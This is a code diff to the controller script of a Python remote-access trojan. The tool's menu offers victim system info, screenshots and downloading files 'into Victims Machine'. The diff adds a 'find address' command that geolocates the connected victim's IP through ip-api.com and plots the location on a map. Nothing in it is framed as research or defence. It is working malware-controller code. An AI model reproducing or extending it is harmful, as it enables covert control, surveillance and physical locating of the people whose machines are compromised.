@@ -7,6 +7,11 @@ try :
 	import platform
 	import socket
 	import random
+	import webbrowser
+	
+	import requests
+	import folium
+
 
 except :
 
@@ -15,7 +20,7 @@ except :
 		Execution error:
 
 			You required some basic Python libraries. 
-			This application use : os , sys , time , platform , socket , random .
+			This application use : os , sys , time , platform , socket , random , folium .
 			Please, check if you have all of them installed in your system.
 
 		""")
@@ -68,7 +73,7 @@ def Socket_Creation () :
 		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		s.setblocking(1)
 		
-		Host = ""
+		Host = "127.0.0.1"
 		Port = sys.argv[1]
 
 	except IndexError :
@@ -147,6 +152,49 @@ def Socket_Accept():
 		time.sleep(1)
 		sys.exit()
 
+
+
+
+
+def get_info_by_ip(ip):
+    print("INFO ABOUT IP:")
+    try:
+        response = requests.get(url=f"http://ip-api.com/json/{ip}").json()
+        data = {
+            '[IP]': response.get('query'),
+            '[PROVAIDER]': response.get('isp'),
+            '[ORGANISATION]': response.get('orgy'),
+            '[TIMEZONE]': response.get('timezone'),
+            '[COUNTRY]': response.get('country'),
+            '[REGION]': response.get('regionName'),
+            '[CITY]': response.get('city'),
+            '[ZIP]': response.get('zip'),
+            '[LAT]': response.get('lat'),
+            '[LON]': response.get('lon')      
+        }
+        for k, v in data.items():
+            print(f"{k}: {v}")
+
+        if input("- are you show marker maps ?[Y/press]: ") in ["y" , "Y" , "yes" , "YES"]:
+            lat = response.get('lat')
+            lon = response.get('lon') 
+
+            try:
+                map = folium.Map(location=[lat , lon] , zoom_start=5)
+                folium.Marker(location=[lat , lon] , popup=None).add_to(map)
+                map.save("index.html")
+                webbrowser.open_new_tab("index.html")
+            except ValueError :
+                print(red + "[The IP address may be local or wrong :( ]" + endc)
+        
+    except requests.exceptions.ConnectionError:
+        print("[!] Connection error")
+
+
+
+
+
+
 def Send_Commands(Connection) :
  
 	while True :
@@ -162,7 +210,8 @@ def Send_Commands(Connection) :
 			print (green + "[+] quit         --> " + endc + "{ Close The Connection }" + endc)
 			print (green + "[+] banner       --> " + endc + "{ Display That Cute Banner }" + endc)
 			print (green + "[+] about        --> " + endc + "{ A Simple Description About The Tool " + endc)
-			print (green + "[+] sysinfo      --> " + endc + "{ Display Info About The Target's Machine }" + endc)                
+			print (green + "[+] sysinfo      --> " + endc + "{ Display Info About The Target's Machine }" + endc)
+			print (green + "[+] find address --> " + endc + "{ Display Info About The device location  }" + endc)                
 			print (green + "[+] cwd          --> " + endc + "{ Display The Current Working Directory } " + endc)
 			print (green + "[+] url download --> " + endc + "{ Download Files into Victims Machine Over Internet }")
 			print (green + "[+] screenshot   --> " + endc + "{ Take A Screenshot }" + endc)
@@ -175,6 +224,14 @@ def Send_Commands(Connection) :
  
 			print("")
 			continue
+
+		elif Commands == "exit" or Commands == "quit" :
+ 
+			print("")
+			Connection.send(Commands.encode())
+			Connection.close ()
+			s.close ()
+			sys.exit()
 
 		elif Commands == "banner" :
 
@@ -214,14 +271,11 @@ def Send_Commands(Connection) :
 			print(green + "[.]~{ language    : " + endc + language)
 			
 			print("")
- 
-		elif Commands == "exit" or Commands == "quit" :
- 
-			print("")
-			Connection.send(Commands.encode())
-			Connection.close ()
-			s.close ()
-			sys.exit()
+
+		elif Commands == "find address":
+
+			get_info_by_ip(address[0])
+
  
 		elif Commands == "cwd" :
  
@@ -490,3 +544,4 @@ if __name__ == '__main__':
 	Socket_Creation ()
 	Socket_Bind ()
 	Socket_Accept ()
+	
